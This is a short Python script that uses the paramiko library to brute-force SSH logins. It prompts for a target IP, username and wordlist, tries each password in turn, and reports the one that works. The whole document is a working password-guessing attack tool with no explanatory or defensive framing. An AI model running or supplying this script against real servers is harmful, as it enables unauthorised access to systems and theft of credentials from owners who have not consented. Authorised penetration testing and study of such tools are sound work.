import paramiko

def ssh_bruteforce(target, username, wordlist):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(wordlist, "r") as f:
        for password in f:
            password = password.strip()
            try:
                ssh.connect(target, username=username, password=password, timeout=2)
                print(f"[+] SUCCESS! Password found: {password}")
                ssh.close()
                return
            except:
                print(f"[-] Failed: {password}")
    print("[-] Password not found")

target = input("Target IP: ")
username = input("Username: ")
wordlist = input("Wordlist path: ")
ssh_bruteforce(target, username, wordlist)
